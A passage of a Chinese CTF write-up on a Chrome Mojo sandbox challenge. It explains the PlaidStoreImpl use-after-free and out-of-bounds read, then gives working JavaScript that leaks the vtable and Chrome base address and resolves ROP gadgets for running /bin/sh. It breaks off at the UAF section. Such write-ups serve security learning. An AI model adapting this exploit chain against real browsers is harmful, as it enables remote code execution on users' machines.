<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">PlaidStoreImpl::PlaidStoreImpl(</span><br><span class="line">        RenderFrameHost *render_frame_host)</span><br><span class="line">        : render_frame_host_(render_frame_host) &#123;&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>而<code>PlaidStoreImpl::Create</code>函数内部会调用<code>mojo::MakeSelfOwnedReceiver</code>函数。该函数将会把Mojo管道的一端<code>Receiver</code>与当前<code>PlaidStoreImpl</code>实例关联（注意传入的<code>render_frame_host</code>使用的 <strong><code>unique</code>智能指针类型为<code>PlaidStoreImpl</code></strong>）。这样，当Mojo管道关闭或者发生错误，<code>recevier</code>便可将当前<code>PlaidStoreImpl</code>实例释放。如此便达到了关联<code>PlaidStoreImpl</code>生命周期的目的。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// static</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PlaidStoreImpl::Create</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    RenderFrameHost *render_frame_host,</span></span></span><br><span class="line"><span class="function"><span class="params">    mojo::PendingReceiver&lt;blink::mojom::PlaidStore&gt; receiver)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mojo::MakeSelfOwnedReceiver(<span class="built_in">std</span>::make_unique&lt;PlaidStoreImpl&gt;(render_frame_host),</span><br><span class="line">                                <span class="built_in">std</span>::move(receiver));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但是，<code>render_frame_host</code>并没有与当前<code>PlaidStoreImpl</code>实例关联。也就是说若<code>render_frame_host</code>被析构，当前<code>PlaidStoreImpl</code>实例将仍然存在。</p>
<blockquote>
<p>一个<code>render</code>进程中的<code>RenderFrame</code>对应<code>browser</code>进程中的<code>RenderFrameHost</code>。</p>
<p>当打开新的tab或iframe时，<code>browser</code>将会对应的创建<code>RenderFrameHost</code>对象</p>
<p>释放也是如此，<strong>当某个tab或iframe被释放时，对应的<code>RenderFrameHost</code>对象将会被释放</strong>。</p>
<p>参考：<a href="https://blog.csdn.net/luoshengyang/article/details/50450100?biz_id=102&amp;utm_term=renderFrameHost&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-50450100&amp;spm=1018.2118.3001.4187" target="_blank" rel="noopener">Chromium网页Frame Tree创建过程分析</a></p>
</blockquote>
<p>这样，我们可以在保证<code>Mojo Pipe</code>不断开的前提下，将<code>render_frame_host</code>析构，之后就可以在<code>PlaidStoreImpl</code>类函数中继续使用<code>render_frame_host</code>，以达到UAF的目的。</p>
<blockquote>
<p>总结：</p>
<ol>
<li>
<p>若关闭Mojo管道，则<code>PlaidStoreImpl</code>实例将会被析构；</p>
</li>
<li>
<p>若析构<code>render_frame_host</code>，则对应<code>PlaidStoreImpl</code>实例将仍然存在。</p>
</li>
</ol>
</blockquote>
</li>
</ul>
<h2 id="5-调试与利用过程">5. 调试与利用过程</h2>
<h3 id="a-OOB">a. OOB</h3>
<ul>
<li>
<p>我们先写一段OOB POC，看看会泄露出什么信息。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 调用MojoJS接口时一定要将这些js包含入html中 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"mojo_js/mojo/public/js/mojo_bindings.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"mojo_js/third_party/blink/public/mojom/plaidstore/plaidstore.mojom.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">dec2hex</span><span class="params">(dec)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> <span class="string">"0x"</span> + dec.toString(<span class="number">16</span>);</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">bytes2DWORD</span><span class="params">(bytes)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> value = <span class="number">0</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span></span><br><span class="line">            value = value * 0x100 + bytes[7 - i];</span><br><span class="line">        &#125;</span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> value;</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">success</span><span class="params">(msg)</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="string">'[+] '</span> + msg);</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.body.innerText += <span class="string">'[+] '</span> + msg + <span class="string">'\n'</span>;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="comment">// OOB漏洞测试</span></span></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">oob</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="string">"OOB"</span>);</span></span><br><span class="line"><span class="actionscript">        <span class="comment">// 获取plaidStore实例</span></span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> plaidStorePtr = <span class="keyword">new</span> blink.mojom.PlaidStorePtr();</span></span><br><span class="line"><span class="actionscript">        <span class="comment">// 将plaidStore实例与mojo pipe绑定</span></span></span><br><span class="line">        Mojo.bindInterface(</span><br><span class="line"><span class="actionscript">            blink.mojom.PlaidStore.name,            <span class="comment">// interfaceName</span></span></span><br><span class="line"><span class="actionscript">            <span class="comment">// 建立mojo pipe，并返回该管道的handle</span></span></span><br><span class="line"><span class="actionscript">            mojo.makeRequest(plaidStorePtr).handle, <span class="comment">// request_handle</span></span></span><br><span class="line"><span class="actionscript">            <span class="string">"context"</span>,                              <span class="comment">// scope</span></span></span><br><span class="line"><span class="actionscript">            <span class="literal">true</span>);                                  <span class="comment">// userBroserInterfaceBroker</span></span></span><br><span class="line"><span class="actionscript">        <span class="comment">// plaidStore中存储的是int8类型的值。本次填充0x10个元素</span></span></span><br><span class="line"><span class="actionscript">        plaidStorePtr.storeData(<span class="string">"aaaa"</span>, [<span class="number">0x31</span>, <span class="number">0x32</span>, <span class="number">0x33</span>, <span class="number">0x34</span>, <span class="number">0x35</span>, <span class="number">0x36</span>, <span class="number">0x37</span>, <span class="number">0x38</span>,</span></span><br><span class="line">            0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48]);</span><br><span class="line"><span class="actionscript">        <span class="comment">// getData接口返回Promise对象，需要获取其中的PromiseValue</span></span></span><br><span class="line"><span class="javascript">        plaidStorePtr.getData(<span class="string">"aaaa"</span>, <span class="number">0x18</span>).then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="actionscript">            <span class="comment">// 返回的数组元素是int8类型</span></span></span><br><span class="line"><span class="actionscript">            <span class="comment">// 对数组使用slice函数，取数组的第0x20至0x50个的元素</span></span></span><br><span class="line">            success(dec2hex(bytes2DWORD(res.data.slice(0x10, 0x18))));</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    oob();</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>启动调试器后，先在<code>PlaidStoreImpl::Create</code>函数上下个断点</p>
<p><img src="/2020/10/mojo/breakCreate.png" alt="img"></p>
<p>之后执行<code>run</code>，断在<code>PlaidStoreImpl::Create</code>函数内部。在这里我们可以注意到，<code>PlaidStoreImpl</code>的大小为0x28bytes。</p>
<p><img src="/2020/10/mojo/sizeofPlaidStore.png" alt="img"></p>
<blockquote>
<p>为什么<code>sizeof(PlaidStoreImpl) == 0x28</code>呢？因为下一个要执行的函数是<code>operator new</code>。而这个<code>0x28</code>正是传入的内存大小。</p>
<p>如何知道那个<code>0x555xxxxx</code>函数是<code>operator new</code>呢？先单步跟踪进去，然后一个<code>frame</code>指令，或者将函数调用链打印出来的<code>bt</code>指令。第一个函数就是。</p>
<p><img src="/2020/10/mojo/operatorNew.png" alt="img"></p>
<p>再一个简单的方法就是使用<code>c++filt</code>命令，将<code>name mangling</code>后的函数名称还原回先前的函数名称。</p>
<p><img src="/2020/10/mojo/cppfilt.png" alt="img"></p>
</blockquote>
<p>同时，当<code>operator new</code>函数执行完成后，返回的<code>%rax</code>地址即为<code>PlaidStoreImpl</code>的地址。使用<code>set $ps_addr = $rax</code> gdb命令将该地址存储到gdb的临时变量中。之后直接执行<code>finish</code>命令，跳过该函数剩余的构造<code>PlaidStoreImpl</code>实例的过程（该过程包括但不限于<strong>设置虚表地址等</strong>）。</p>
<p><img src="/2020/10/mojo/storePsAddr.png" alt="img"></p>
</li>
<li>
<p><code>fini</code>命令之后，我们先看一下<code>PlaidStoreImpl</code>实例的内存布局（相关成员均标注在图片上）</p>
<p><img src="/2020/10/mojo/plaidStoreImplMap.png" alt="img"></p>
<blockquote>
<p>C++的编译器保证虚函数表的指针存在于对象实例中<strong>最前面</strong>的位置。</p>
</blockquote>
</li>
<li>
<p>我们看一下<code>map</code>的相关内存结构，看看到底泄露的是什么地址 - <a href="https://source.chromium.org/chromium/chromium/src/+/master:buildtools/third_party/libc++/trunk/include/map;l=898;drc=ce29422a5a0922393f61efe899ec80e9894e09ed;bpv=0;bpt=1" target="_blank" rel="noopener">chrome std::map 源码</a></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> _<span class="title">LIBCPP_TEMPLATE_VIS</span> <span class="title">map</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">typedef</span> __tree&lt;__value_type, __vc, __allocator_type&gt;   __base;</span><br><span class="line">    __base __tree_;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>众所周知，map内部使用<code>rb_tree</code>，因此我们继续点进去看看 - <a href="https://source.chromium.org/chromium/chromium/src/+/master:buildtools/third_party/libc++/trunk/include/__tree;drc=ce29422a5a0922393f61efe899ec80e9894e09ed;bpv=0;bpt=1;l=979" target="_blank" rel="noopener">chrome std::tree 源码</a></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">Tp</span>, <span class="title">class</span> _<span class="title">Compare</span>, <span class="title">class</span> _<span class="title">Allocator</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">class</span> __<span class="title">tree</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">typedef</span> _Tp                                      value_type;</span><br><span class="line">    <span class="keyword">typedef</span> _Compare                                 value_compare;</span><br><span class="line">    <span class="keyword">typedef</span> _Allocator                               allocator_type;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">typedef</span> allocator_traits&lt;allocator_type&gt;         __alloc_traits;</span><br><span class="line">    <span class="keyword">typedef</span> <span class="keyword">typename</span> __make_tree_node_types&lt;value_type,</span><br><span class="line">        <span class="keyword">typename</span> __alloc_traits::void_pointer&gt;::type</span><br><span class="line">                                                    _NodeTypes;</span><br><span class="line">    <span class="keyword">typedef</span> <span class="keyword">typename</span> _NodeTypes::__parent_pointer      __parent_pointer;</span><br><span class="line">    <span class="keyword">typedef</span> <span class="keyword">typename</span> _NodeTypes::__iter_pointer        __iter_pointer;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    __iter_pointer                                     __begin_node_;</span><br><span class="line">    __compressed_pair&lt;<span class="keyword">__end_node_t</span>, __node_allocator&gt;  __pair1_;</span><br><span class="line">    __compressed_pair&lt;size_type, value_compare&gt;        __pair3_;</span><br><span class="line">    <span class="comment">// ...</span></span><br></pre></td></tr></table></figure>
<p>可以看到，该tree有三个成员变量，而第一个pointer指向的是根结点。tree成员变量的数量也与我们<code>PlaidStoreImpl</code>内存布局所对应。</p>
</li>
<li>
<p>我们再看看tree第一个pointer所指向的<strong>叶结点的成员变量</strong>有哪些 - <a href="https://source.chromium.org/chromium/chromium/src/+/master:buildtools/third_party/libc++/trunk/include/__tree;drc=ce29422a5a0922393f61efe899ec80e9894e09ed;l=751" target="_blank" rel="noopener">chrome tree_node 源码</a></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">Pointer</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">class</span> __<span class="title">tree_end_node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">typedef</span> _Pointer pointer;</span><br><span class="line">    pointer __left_;</span><br><span class="line">  <span class="comment">// ....</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">VoidPtr</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">class</span> __<span class="title">tree_node_base</span></span></span><br><span class="line"><span class="class">    :</span> <span class="keyword">public</span> __tree_node_base_types&lt;_VoidPtr&gt;::__end_node_type</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">typedef</span> <span class="keyword">typename</span> _NodeBaseTypes::__node_base_pointer pointer;</span><br><span class="line">    <span class="keyword">typedef</span> <span class="keyword">typename</span> _NodeBaseTypes::__parent_pointer __parent_pointer;</span><br><span class="line"></span><br><span class="line">    pointer          __right_;</span><br><span class="line">    __parent_pointer __parent_;</span><br><span class="line">    <span class="keyword">bool</span> __is_black_;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">   <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">Tp</span>, <span class="title">class</span> _<span class="title">VoidPtr</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">class</span> __<span class="title">tree_node</span></span></span><br><span class="line"><span class="class">    :</span> <span class="keyword">public</span> __tree_node_base&lt;_VoidPtr&gt;</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">typedef</span> _Tp __node_value_type;</span><br><span class="line">    __node_value_type __value_;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>即，一个<code>__tree_node</code>实例有以下五个成员，分别是</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">pointer             __left_;</span><br><span class="line">pointer             __right_;</span><br><span class="line">__parent_pointer    __parent_;</span><br><span class="line"><span class="keyword">bool</span>                __is_black_;</span><br><span class="line">__node_value_type   __value_;   <span class="comment">// `__node_value_type`在这里是`pair&lt;string, vector&lt;uint8_t&gt;&gt;`</span></span><br></pre></td></tr></table></figure>
<p>最后，我们查看一下<code>__tree_node</code>内存布局</p>
<blockquote>
<p>在查看内存布局前，先令chrome执行完<code>PlaidStoreImpl::storeData</code>函数，将数据存入tree，方便调试。</p>
</blockquote>
<p><img src="/2020/10/mojo/treeNodeMap.png" alt="img"></p>
<blockquote>
<p>图中红色框的0x30字节为<code>__value__</code>成员变量。其中，前0x18个字节是<code>string</code>类实例（注意那个<code>0x0000000061616161</code>，这正是填入的keyString<code>1111</code>），后0x18字节是<code>vector</code>类实例。</p>
</blockquote>
</li>
<li>
<p>而<code>vector</code>成员变量如下，该类共有三个成员，这里我们只关心<code>__begin_</code>成员所指向的内存。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">Allocator</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">class</span> _<span class="title">LIBCPP_TEMPLATE_VIS</span> <span class="title">vector</span>&lt;bool, _Allocator&gt;</span></span><br><span class="line"><span class="class">    :</span> <span class="keyword">private</span> __vector_base_common&lt;<span class="literal">true</span>&gt;</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    __storage_pointer                                      __begin_;</span><br><span class="line">    size_type                                              __size_;</span><br><span class="line">    __compressed_pair&lt;size_type, __storage_allocator&gt; __cap_alloc_;</span><br><span class="line">  <span class="comment">// ...</span></span><br></pre></td></tr></table></figure>
<p>以下是该vector所指向的内存位置，可以看到前0x10个字节的值是先前执行<code>PlaidStore::storeData</code>函数时写入的。而我们可以通过该<code>vector</code>越界向后读取。</p>
<p><img src="/2020/10/mojo/vectorMap.png" alt="img"></p>
</li>
</ul>
<blockquote>
<p>为什么要这么大动干戈，从上向下查找<code>vector</code>的泄露地址呢？因为我们需要寻找一下，<strong>这个地址是否与其他已经获得的地址之间存在关系</strong>。</p>
<p>在这题中，我们可以确认<code>vecotr __begin_</code>与<code>PlaidStoreImpl</code>地址位于同一个段。</p>
</blockquote>
<ul>
<li>
<p>那么，该越界读取什么来泄露信息，泄露什么信息呢？</p>
<p>由于<code>PlaidStore</code>实例与<code>vector __begin_</code>所指向的地址<strong>位于同一个段</strong>。同时，<code>PlaidStore</code>实例中存在虚表，因此我们可以通过<code>vector</code>来越界读取<code>PlaidStore vtable</code>地址。这样就可以通过虚表地址确定一系列的地址（包括但不限于确定ELF基地址等）。</p>
<blockquote>
<p>类实例的虚表位于<code>rodata</code>段中，也就是说，<code>vtable</code>地址与<strong>ELF基地址</strong>的相对偏移是保持不变的。</p>
</blockquote>
<p><img src="/2020/10/mojo/vmmap.png" alt="img"></p>
<p>我们需要大量分配<code>PlaidStoreImpl</code>与<code>vector</code>，使它们呈线性交替存放，之后就可以通过越界读来<strong>获取虚表地址</strong>。</p>
<blockquote>
<p>注意虚表地址中的后三个十六进制数<code>0x7a0</code>，我们将通过这个来识别读取到的数据是否是虚表地址，而不是采用相对偏移的方式来读取，这样就可以最大程度上避免<strong>由于内存分配器的不同而导致的偏移差异</strong>。</p>
</blockquote>
<p>而虚表与chrome基地址的偏移为<code>0x000055555f50a7a0 - 0x555555554000 == 0x9fb67a0</code>，获取虚表地址后就可以通过相对偏移来计算出ELF基地址。</p>
<p><img src="/2020/10/mojo/chromeBaseOffset.png" alt="img"></p>
<p>ELF基地址有了之后，我们就可以以下命令来获取一系列<code>gadgets</code>地址。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary ./chrome &gt; gadgets.txt</span><br></pre></td></tr></table></figure>
<blockquote>
<p>由于chrome文件过大，执行该命令时需要<strong>4GB内存</strong>左右</p>
<p>建立出的<code>gadgets.txt</code>的文件大小将近<strong>400MB</strong>。</p>
</blockquote>
<p>这样就可以获取到以下gadget的相对偏移</p>
<blockquote>
<p>这些gadgets组合在一起便可<strong>劫持栈</strong>，并利用<code>syscall</code>执行<code>/bin/sh</code></p>
</blockquote>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="number">0x000000000880dee8</span> : <span class="keyword">xchg</span> <span class="built_in">rax</span>, <span class="built_in">rsp</span> <span class="comment">; clc ; pop rbp ; ret</span></span><br><span class="line"><span class="number">0x0000000002e4630f</span> : <span class="keyword">pop</span> <span class="built_in">rdi</span> <span class="comment">; ret</span></span><br><span class="line"><span class="number">0x0000000002d278d2</span> : <span class="keyword">pop</span> <span class="built_in">rsi</span> <span class="comment">; ret</span></span><br><span class="line"><span class="number">0x0000000002e9998e</span> : <span class="keyword">pop</span> <span class="built_in">rdx</span> <span class="comment">; ret</span></span><br><span class="line"><span class="number">0x0000000002e651dd</span> : <span class="keyword">pop</span> <span class="built_in">rax</span> <span class="comment">; ret</span></span><br><span class="line"><span class="number">0x0000000002ef528d</span> : <span class="keyword">syscall</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>所以最终，我们编写以下代码来泄露我们的目标地址</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 调用MojoJS接口时一定要将这些js包含入html中 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"mojo_js/mojo/public/js/mojo_bindings.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"mojo_js/third_party/blink/public/mojom/plaidstore/plaidstore.mojom.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">dec2hex</span><span class="params">(dec)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> <span class="string">"0x"</span> + dec.toString(<span class="number">16</span>);</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">bytes2DWORD</span><span class="params">(bytes)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> value = <span class="number">0</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span></span><br><span class="line">            value = value * 0x100 + bytes[7 - i];</span><br><span class="line">        &#125;</span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> value;</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">success</span><span class="params">(msg)</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="string">'[+] '</span> + msg);</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.body.innerText += <span class="string">'[+] '</span> + msg + <span class="string">'\n'</span>;</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="javascript">    <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> try_size = <span class="number">100</span>;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> plaidStorePtrList = [];</span></span><br><span class="line"><span class="javascript">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; try_size; i++) &#123;</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">var</span> plaidStorePtr = <span class="keyword">new</span> blink.mojom.PlaidStorePtr();</span></span><br><span class="line"></span><br><span class="line">            Mojo.bindInterface(</span><br><span class="line">                blink.mojom.PlaidStore.name,</span><br><span class="line">                mojo.makeRequest(plaidStorePtr).handle,</span><br><span class="line"><span class="actionscript">                <span class="string">"context"</span>,</span></span><br><span class="line"><span class="actionscript">                <span class="literal">true</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">await</span> plaidStorePtr.storeData(<span class="string">"aaaa"</span>, <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(<span class="number">0x28</span>).fill(<span class="number">0x30</span> + i));</span></span><br><span class="line">            plaidStorePtrList.push(plaidStorePtr);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> PlaidStore_vtable_addr = <span class="number">0</span>;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> render_frame_host_addr = <span class="number">0</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; try_size; i++) &#123;</span></span><br><span class="line"><span class="actionscript">            <span class="comment">// 注意这里使用await，保证异步操作。因为promise回调是同步的。</span></span></span><br><span class="line"><span class="actionscript">            <span class="comment">// 获取返回的promiseValue</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">let</span> res = <span class="keyword">await</span> plaidStorePtrList[i].getData(<span class="string">"aaaa"</span>, <span class="number">0x100</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">let</span> data = res.data;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0x28</span>; j &lt; <span class="number">0x100</span> - <span class="number">0x8</span>; j += <span class="number">0x8</span>) &#123;</span></span><br><span class="line"><span class="actionscript">                <span class="comment">// 尽管返回的是string，但仍然可以直接当作十六进制数字来使用。</span></span></span><br><span class="line"><span class="actionscript">                <span class="keyword">var</span> hex = bytes2DWORD(data.slice(j, j + <span class="number">0x8</span>));</span></span><br><span class="line">                if ((hex &amp; 0xfff) == 0x7a0) &#123;</span><br><span class="line">                    PlaidStore_vtable_addr = dec2hex(hex);</span><br><span class="line">                    render_frame_host_addr = dec2hex(bytes2DWORD(data.slice(j + 0x8, j + 0x10)));</span><br><span class="line"><span class="actionscript">                    success(<span class="string">"PlaidStore vtable: "</span> + PlaidStore_vtable_addr);</span></span><br><span class="line"><span class="actionscript">                    success(<span class="string">"render_frame_host: "</span> + render_frame_host_addr);</span></span><br><span class="line"><span class="actionscript">                    <span class="keyword">break</span>;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            if (PlaidStore_vtable_addr != 0)</span><br><span class="line"><span class="actionscript">                <span class="keyword">break</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line">        if (PlaidStore_vtable_addr == 0)</span><br><span class="line"><span class="actionscript">            <span class="keyword">throw</span> <span class="string">"PlaidStore vtable addr leak failed!"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> chromeTextBase = PlaidStore_vtable_addr - <span class="number">0x9fb67a0</span>;</span></span><br><span class="line"><span class="actionscript">        success(<span class="string">"chrome Text Base: "</span> + dec2hex(chromeTextBase));</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> xchg_addr = chromeTextBase + <span class="number">0x000000000880dee8</span>;</span></span><br><span class="line"><span class="actionscript">        success(<span class="string">"xchg_addr: "</span> + dec2hex(xchg_addr));</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> pop_rdi_ret = chromeTextBase + <span class="number">0x0000000002e4630f</span>;</span></span><br><span class="line"><span class="actionscript">        success(<span class="string">"pop_rdi_ret: "</span> + dec2hex(pop_rdi_ret));</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> pop_rsi_ret = chromeTextBase + <span class="number">0x0000000002d278d2</span>;</span></span><br><span class="line"><span class="actionscript">        success(<span class="string">"pop_rsi_ret: "</span> + dec2hex(pop_rsi_ret));</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> pop_rdx_ret = chromeTextBase + <span class="number">0x0000000002e9998e</span>;</span></span><br><span class="line"><span class="actionscript">        success(<span class="string">"pop_rdx_ret: "</span> + dec2hex(pop_rdx_ret));</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> pop_rax_ret = chromeTextBase + <span class="number">0x0000000002e651dd</span>;</span></span><br><span class="line"><span class="actionscript">        success(<span class="string">"pop_rax_ret: "</span> + dec2hex(pop_rax_ret));</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> syscall_addr = chromeTextBase + <span class="number">0x0000000002ef528d</span>;</span></span><br><span class="line"><span class="actionscript">        success(<span class="string">"syscall_addr: "</span> + dec2hex(syscall_addr));</span></span><br><span class="line">    &#125;</span><br><span class="line">    pwn();</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>泄露出的地址为</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[+] PlaidStore vtable: <span class="number">0x557731d667a0</span></span><br><span class="line">[+] render_frame_host: <span class="number">0x2fde7ced7000</span></span><br><span class="line">[+] chrome Text Base: <span class="number">0x557727db0000</span></span><br><span class="line">[+] xchg_addr: <span class="number">0x5577305bdee8</span></span><br><span class="line">[+] pop_rdi_ret: <span class="number">0x55772abf630f</span></span><br><span class="line">[+] pop_rsi_ret: <span class="number">0x55772aad78d2</span></span><br><span class="line">[+] pop_rdx_ret: <span class="number">0x55772ac4998e</span></span><br><span class="line">[+] pop_rax_ret: <span class="number">0x55772ac151dd</span></span><br><span class="line">[+] syscall_addr: <span class="number">0x55772aca528d</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="b-UAF">b. UAF</h3>
<ul>
<li>
